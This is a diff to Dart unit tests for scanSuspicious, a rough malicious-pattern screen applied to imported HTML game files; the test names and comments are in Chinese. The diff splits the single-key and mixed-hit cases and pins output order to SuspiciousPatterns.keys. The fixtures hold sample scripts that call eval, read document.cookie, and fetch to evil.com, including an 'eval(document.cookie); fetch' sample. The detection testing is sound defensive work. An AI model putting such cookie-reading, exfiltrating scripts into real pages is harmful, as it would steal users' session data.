@@ -594,22 +594,38 @@ function wizard() { return `
   });
 
   group('scanSuspicious — 恶意模式粗筛', () {
-    test('命中矩阵：返回对应键集（排序确定）', () {
-      const samples = <(String, List<String>)>[
-        ('<script>eval("1+1")</script>', ['eval']),
-        ('<script>window.eval(code)</script>', ['eval']),
-        ('<script>var x = document.cookie;</script>', ['document.cookie']),
+    test('命中矩阵（单键样本）：返回对应键（输出序为单元素）', () {
+      const samples = <(String, String)>[
+        ('<script>eval("1+1")</script>', 'eval'),
+        ('<script>window.eval(code)</script>', 'eval'),
+        ('<script>var x = document.cookie;</script>', 'document.cookie'),
         ('<script>fetch("http://evil.com/data")</script>',
-            ['cross-origin-fetch']),
+            'cross-origin-fetch'),
         ("<script>fetch('https://evil.com')</script>",
-            ['cross-origin-fetch']),
-        ('<script>fetch(`//evil.com/x`)</script>', ['cross-origin-fetch']),
-        ('<script>eval(document.cookie); fetch("http://evil.com")</script>',
-            ['cross-origin-fetch', 'document.cookie', 'eval']),
+            'cross-origin-fetch'),
+        ('<script>fetch(`//evil.com/x`)</script>', 'cross-origin-fetch'),
       ];
-      for (final (html, expected) in samples) {
-        expect(scanSuspicious(html), expected, reason: 'html=$html');
+      for (final (html, key) in samples) {
+        expect(scanSuspicious(html), [key], reason: 'html=$html');
       }
+    });
+
+    test('混合命中 → 输出序 == SuspiciousPatterns.keys 声明序（键序契约锁定）',
+        () {
+      final html =
+          '<script>eval(document.cookie); fetch("http://evil.com")</script>';
+      // 固定值锚（防 keys 被无意识重排而测试静默跟随——重排必须连测试一起换）。
+      expect(scanSuspicious(html),
+          ['cross-origin-fetch', 'document.cookie', 'eval']);
+      // 键序契约锚：输出必须逐元素跟随 keys 声明序（非字典序）。
+      // 当前 keys 恰为字典序，契约锚定的是「声明序」面——未来在 keys 中插入
+      // 非字典序新键时，输出跟随 keys；若实现擅自改回字典序排序，在 keys
+      // 非字典序时本断言即变红。
+      expect(
+        scanSuspicious(html),
+        [for (final key in SuspiciousPatterns.keys) key],
+        reason: '输出序必须等于 SuspiciousPatterns.keys 声明序（全键命中场景）',
+      );
     });
 
     test('干净样本 / 同源引用 → 空键集（粗筛误报不拦截）', () {
@@ -730,7 +746,9 @@ function wizard() { return `
       final content =
           utf8.encode('<script>eval(document.cookie); fetch("http://evil.com")</script>');
       final result = await importGame(sim, 'risky.html', content);
-      expect(result.warnings, ['cross-origin-fetch', 'document.cookie', 'eval']);
+      // 全键命中 → warnings 输出序 = SuspiciousPatterns.keys 声明序。
+      expect(result.warnings,
+          [for (final key in SuspiciousPatterns.keys) key]);
       expect(
         File('${sim.path}${Platform.pathSeparator}risky.html').existsSync(),
         isTrue,
